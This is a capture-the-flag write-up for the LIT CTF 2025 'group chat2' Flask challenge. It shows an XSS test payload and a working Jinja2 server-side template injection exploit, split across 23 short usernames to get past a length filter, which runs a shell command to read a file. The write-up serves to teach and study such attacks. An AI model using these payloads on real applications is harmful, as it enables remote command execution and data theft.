---
title: "web/group chat2 - Lexington Informatics Tournament CTF 2025"
category: "web"
subcategory: "ssti"
type: "writeup"
tags: ["flask", "ssti", "web", "lit", "2025", "xss", "jinja2", "lexington-informatics-tourname", "lexington-informatics-tournament-c", "ctf-writeup"]
summary: "We were also provided with the main.py file as part of this challenge."
source:
  name: "CTFtime writeup #40379"
  url: "https://ctftime.org/writeup/40379"
original_source: "https://github.com/S450R1/lit-ctf-writeups/blob/main/web/group-chat2/README.md"
ctf:
  name: "Lexington Informatics Tournament CTF 2025"
  year: 2025
  challenge: "web/group chat2"
---

## Metadata

- **CTF:** Lexington Informatics Tournament CTF 2025
- **Task:** web/group chat2
- **Author team:** WhiteDukesDZ
- **CTFtime tags:** flask, ssti, web, lit, 2025
- **CTFtime:** <https://ctftime.org/writeup/40379>
- **Original writeup:** <https://github.com/S450R1/lit-ctf-writeups/blob/main/web/group-chat2/README.md>

---
# WhiteDukesDZ - LIT CTF 2025 Writeup: Group Chat Challenge

![WhiteDukesDZ Logo](<https://raw.githubusercontent.com/S450R1/lit-ctf-writeups/refs/heads/main/web/group-chat2/challenge/web-group-chat2.png>)

We were also provided with the `[main.py](http://main.py)` file as part of this challenge.

\---

## Challenge Summary

This challenge presented a simple Python Flask web application simulating a group chat. The goal was to analyze the application for vulnerabilities and exploit them to retrieve the flag.

## Provided Files  
\- `[main.py](http://main.py)` (Flask web app)  
\- Challenge image (see above)

## Application Analysis

After reviewing `[main.py](http://main.py)`, we identified three main endpoints:

1\. **`/` (Home):**  
\- If `username` is not set in the session, redirects to `/set_username`.  
\- Otherwise, renders the chat page.

2\. **`/set_username`:**  
\- Accepts `GET` and `POST` requests.  
\- On `GET`, displays a username form.  
\- On `POST`, verifies the provided `username`:  
\- If `username` length > 14, registration is refused.  
\- If `username` contains both `{` and `}`, registration is refused.  
\- Otherwise, registration is accepted and redirects to `/`.

3\. **`/send_message`:**  
\- Accepts only `POST` requests with a `message`.  
\- If `username` is not set in session, redirects to `/set_username`.  
\- If `message` contains non-alphanumeric symbols, message is refused.  
\- Otherwise, message is added to `chat_logs` as `username: message` and redirects to `/`.

### Security Observations

\- The `/set_username` endpoint does not filter for XSS payloads in the `username` field. For example, setting `username` to `<script>alert('WhiteDukesDZ')</script>` and sending a message will execute the JavaScript payload:

![WhiteDukesDZ Logo](<https://raw.githubusercontent.com/S450R1/lit-ctf-writeups/refs/heads/main/web/group-chat2/demonstration/xss.png>)

\- However, since the code executes only on the client side and there is no admin bot, this XSS cannot be leveraged to obtain the flag.

### Template Rendering

The chat logs are rendered as follows:

```python  
<div id="chat-box">''' + '  
'.join(chat_logs) + '''  
</div>  
```

If `chat_logs` is:

```python  
chat_logs = [  
"username1: message1",  
"username2: message2",  
...  
"usernameN: messageN"   
]  
```

It will be rendered as:

```html  
username1: message1  
username2: message2  
...  
usernameN: messageN  
```

And since we can control both `username`, `message`, we certainly can cause a <ins>Server Side Template Injection</ins>

To confirm the possibility of a <ins>Server Side Template Injection (SSTI)</ins>, we can leverage our control over both `username` and `message` fields. This allows us to attempt injecting a Jinja2 payload that could execute server-side code.

**Local Testing:**  
1\. Create a `flag.txt` file in the same directory as `[main.py](http://main.py)`:  
```sh  
echo "FLAG{REDACTED}" > flag.txt  
```  
2\. Modify the template in `[main.py](http://main.py)` for the `/` route to include a test payload that reads the contents of `flag.txt`:  
```python  
<div>{{ cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}</div>  
```  
3\. Run the Flask app locally:  
```sh  
python3 [main.py](http://main.py)  
```  
4\. Visit `http://localhost:5000`, set a `username`, and navigate to `/`. You should see the contents of `flag.txt` displayed on the page.

![WhiteDukesDZ Logo](<https://raw.githubusercontent.com/S450R1/lit-ctf-writeups/refs/heads/main/web/group-chat2/demonstration/local-test.png>)

However, on the remote instance, we cannot modify `[main.py](http://main.py)` directly. Therefore, our goal is to inject a payload through user input that results in the template rendering something like:

```html  
{{ cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}  
```

by carefully crafting the values of `username` and `message`.  
\---

## Solution

To exploit the SSTI vulnerability and retrieve the flag, our goal was to make the rendered chat log look like:

```python  
{{cycler.__init__.__globals__.os.popen('cat flag.txt').read()}}  
```

Since we control both `username` and `message`, we can't just split the payload across two users/messages:

\- `username1 = {{cycler.__init__.__globals__.os.popen('cat flag.txt`  
\- `message1 = dummy`  
\- `username2 = '[:12]).read()}}`  
\- `message2 = dummy`

Since we will hit the len(`username`) > 14 condition. We need to find another approach.

We can split our payload into smaller parts by using variables:

```python  
{%set a=cycler%}  
{%set b=a.__init__%}  
{%set c=b.__globals__%}  
{%set d=c.os%}  
{%set e=d.popen%}  
{%set f='cat flag.txt'%}  
{%set g=e(f)%}  
{%set h=g.read%}  
{{h()}}  
```

Since we need to produce the above payload without hitting the constraint of len(`username`) > 14:

`{%set a=cycler%}`  
\- `username1 = {%set a=['`  
\- `message1 = dummy`  
\- `username2 = ',cycler][1]%}`  
\- `message2 = dummy`

`{%set b=a.__init__%}`  
\- `username3 = {%set b=a['`  
\- `message3 = dummy`  
\- `username4 = __init__`  
\- `message4 = dummy`  
\- `username5 = '[11:19]]%}`  
\- `message5 = dummy`

`{%set c=b.__globals__%}`  
\- `username6 = {%set c=b['`  
\- `message6 = dummy`  
\- `username7 = __globals__`  
\- `message7 = dummy`  
\- `username8 = '[11:22]]%}`  
\- `message8 = dummy`

`{%set d=c.os%}`  
\- `username9 = {%set d=c['os`  
\- `message9 = dummy`  
\- `username10 = '[:2]]%}`  
\- `message10 = dummy`

`{%set e=d.popen%}`  
\- `username11 = {%set e=d['`  
\- `message11 = dummy`  
\- `username12 = popen`  
\- `message12 = dummy`  
\- `username13 = '[11:16]]%}`  
\- `message13 = dummy`

`{%set f='cat flag.txt'%}`  
\- `username14 = {%set f='`  
\- `message14 = dummy`  
\- `username15 = cat flag.txt`  
\- `message15 = dummy`  
\- `username16 = '[11:23]%}`  
\- `message16 = dummy`

`{%set g=e(f)%}`  
\- `username17 = {%set g=e([f,'`  
\- `message17 = dummy`  
\- `username18 = '][0])%}`  
\- `message18 = dummy`

`{%set h=g.read%}`  
\- `username19 = {%set h=g['`  
\- `message19 = dummy`  
\- `username20 = read`  
\- `message20 = dummy`  
\- `username21 = '[11:15]]%}`  
\- `message21 = dummy`

`{{h()}}`  
\- `username22 = {{[h,'`  
\- `message22 = dummy`  
\- `username23 = '][0]()}}`  
\- `message23 = dummy`

which is functionally equivalent to our intended payload, as the injected `  
` and extra characters are ignored by the Python slice or the array technique.

We automated this process in `solution/[solve.py](http://solve.py)`. To run the exploit against the remote instance provided by LIT CTF:

```sh  
python3 [solve.py](http://solve.py)  
```

If successful, the script will output the flag:

```sh  
Username set successfully.  
Message sent successfully.  
...  
Username set successfully.  
Message sent successfully.  
LITCTF{c4n7_y0u_b3l13v3_us3rn4m35_c0uld_b3_1000_ch4r5_10ng_b3f0r3??}  
```
